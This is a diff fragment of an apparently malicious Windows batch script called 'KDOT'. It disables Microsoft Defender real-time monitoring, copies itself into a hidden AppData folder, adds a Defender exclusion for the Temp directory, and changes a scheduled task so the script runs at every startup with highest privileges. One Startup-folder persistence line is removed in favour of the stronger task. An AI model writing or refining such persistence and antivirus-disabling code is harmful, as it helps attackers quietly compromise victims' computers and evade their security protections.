@@ -14,12 +14,11 @@ exit
 :naw
 @echo off
 PowerShell Set-MpPreference -DisableRealtimeMonitoring 1
-Copy %~f0 %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 mkdir %localappdata%\KDOT
 COPY %~f0 %localappdata%\KDOT\KDOT.bat
 SCHTASKS /QUERY /TN "KDOT" >NUL 2>&1
 if %errorlevel% equ 0 goto code
-SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat"
+SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat" /RL HIGHEST /F /DELAY 0000:10
 
 :code
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
